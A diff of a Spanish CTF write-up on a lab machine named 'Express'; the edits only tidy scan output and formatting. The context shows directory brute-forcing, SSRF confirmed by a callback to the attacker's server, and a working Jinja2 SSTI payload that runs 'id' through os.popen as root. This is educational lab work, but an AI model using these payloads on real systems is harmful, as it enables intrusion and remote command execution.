@@ -34,7 +34,7 @@ Tras identificar el servicio web en el puerto 80, accedemos a la aplicación y c
 ```bash
 ┌──(kali㉿kali)-[~/CTF/Express/content]
 └─$ feroxbuster -u http://10.0.5.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 100 -q
-                                                                                                                    404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                 403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                 200      GET       25l      127w    10359c http://10.0.5.23/icons/openlogo-75.png
+200      GET       25l      127w    10359c http://10.0.5.23/icons/openlogo-75.png
 301      GET        9l       28w      311c http://10.0.5.23/javascript => http://10.0.5.23/javascript/
 200      GET      368l      933w    10701c http://10.0.5.23/
 301      GET        9l       28w      318c http://10.0.5.23/javascript/jquery => http://10.0.5.23/javascript/jquery/
@@ -170,6 +170,7 @@ Replicamos esta petición desde BurpSuite utilizando el **token del usuario admi
 ![SSRF](/assets/post_img/Express/5ssrf.png)
 
 Para confirmar la vulnerabilidad, levantamos un servidor HTTP en nuestra máquina atacante. Al enviar una petición al endpoint administrativo apuntando a nuestro servidor, recibimos una conexión entrante desde la máquina víctima, confirmando que el servidor realiza peticiones externas controladas por el usuario. Con esto, **confirmamos SSRF funcional**.
+
 ![SSRF2](/assets/post_img/Express/6ssrf-pythonhttp.png)
 ```bash
 ┌──(kali㉿kali)-[~/CTF/Express/content]
@@ -219,7 +220,7 @@ ________________________________________________
 ```
 
 El escaneo revela varios puertos internos abiertos, destacando especialmente el **puerto 9000**, cuya respuesta difiere del resto. 
-```json
+```html
 <form method=\"get\" action=\"/username\">
     <input type=\"text\" name=\"name\" placeholder=\"Enter your name\">\n       
     <input type=\"submit\" value=\"Greet\">\n    
@@ -233,6 +234,7 @@ Después de diferentes pruebas, decidimos realizar una inyección de plantilla m
 ![SniperAttack](/assets/post_img/Express/8-sniperattack.png)
 
 Usando la inyección básica `{{7*'7'}}` , la respuesta del servidor es `7777777`, confirmando una **vulnerabilidad SSTI en Jinja2 sin sandbox**.
+
 ![Jinja2](/assets/post_img/Express/9a-jinja2.png)
 
 Dado que el motor de plantillas evalúa expresiones Python sin restricciones, es posible acceder a `builtins`, importar módulos y ejecutar comandos del sistema. Utilizamos el siguiente payload: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`. La salida confirma **ejecución remota de comandos con privilegios de root**.
